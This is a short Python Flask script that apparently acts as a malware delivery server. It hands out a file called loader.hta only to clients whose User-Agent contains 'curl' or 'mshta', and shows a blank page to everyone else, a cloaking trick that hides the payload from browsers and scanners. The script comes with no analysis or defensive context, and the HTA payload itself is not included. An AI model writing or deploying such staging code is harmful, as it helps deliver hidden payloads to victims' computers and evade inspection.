from flask import Flask, request, send_file

app = Flask(__name__)

@app.route('/loader.hta', methods=['GET'])
def loader():
    return send_file('loader.hta', mimetype='application/octet-stream')

@app.route('/', methods=['GET'])
def index():
    if 'curl' in request.headers.get('User-Agent', '') or 'mshta' in request.headers.get('User-Agent', ''):
        return send_file('loader.hta', mimetype='application/octet-stream')
    else:
        return '<body></body>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
